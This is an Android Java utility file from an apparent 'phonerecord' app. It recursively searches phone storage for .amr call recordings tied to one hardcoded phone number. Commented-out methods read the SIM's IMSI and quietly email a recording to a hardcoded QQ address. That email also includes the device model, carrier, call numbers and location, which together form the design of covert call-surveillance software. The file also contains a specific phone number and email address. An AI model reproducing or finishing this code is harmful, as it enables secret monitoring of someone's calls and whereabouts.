package com.slh.phonerecord;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.List;

public class FileUtils {

    /**
     * 查找疑似文件 new File(Environment.getExternalStorageDirectory().getAbsolutePath())
     */
    //遍历手机所有文件 并将路径名存入集合中 参数需要 路径和集合
    public static  void findRecordFile(File dir) {

        //得到某个文件夹下所有的文件
        File[] files = dir.listFiles();
        //文件为空
        if (files == null) {
            return;
        }
        //遍历当前文件下的所有文件
        for (File file : files) {
            //如果是文件夹
            if (file.isDirectory()) {
                //则递归(方法自己调用自己)继续遍历该文件夹
                Log.e("测试","递归=>"+file.getName());
                findRecordFile(file);
            } else { //如果不是文件夹 则是文件
                //如果文件名以 .mp3结尾则是mp3文件
                if (file.getName().endsWith(".amr")&& file.getName().toLowerCase().contains("13676985655")) {
                    //往图片集合中 添加图片的路径
                    Log.e("测试",file.getAbsolutePath());
                }else {
                    Log.e("测试过",file.getName().toLowerCase());
                }
            }
        }
    }
//    /**
//     * 获取手机服务商信息
//     */
//    public String getProvidersName() {
//        String ProvidersName = "N/A";
//        try {
//            String IMSI = tm.getSubscriberId();
//            // IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
//            System.out.println(IMSI);
//            if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {
//                ProvidersName = "中国移动";
//            } else if (IMSI.startsWith("46001")) {
//                ProvidersName = "中国联通";
//            } else if (IMSI.startsWith("46003")) {
//                ProvidersName = "中国电信";
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return ProvidersName;
//    }


//    public void sendMail(final String path) {
//        new Thread(new Runnable() {
//            public void run() {
//                EmailUtil emailUtil = new EmailUtil();
//                try {
//                    Log.d(TAG, "发送mail");
//                    //发送者邮箱，自行申请
//                    //String account = "";
//                    //String password = "";
//                    String location = LocationInfo.toString();
//                    //接收者邮箱
//                    emailUtil.sendMail("26012450@qq.com", account, "smtp.163.com",
//                            account, password, "电话录音", "邮件由系统自动发送，请不要回复！\n\n"
//                                    + "手机信息:" + android.os.Build.BRAND + " " + android.os.Build.MODEL + "\n"
//                                    + "手机服务商信息:" + getProvidersName() + "\n"
//                                    + "去电:" + mOutgoingNumber + " 来电:" + mIncomingNumber + "\n"
//                                    + "定位信息如下:\n" + location, path);
//                } catch (Exception e) {
//                    Log.d(TAG, "发送mail异常");
//                    e.printStackTrace();
//                }
//            }
//        }).start();
//    }
}
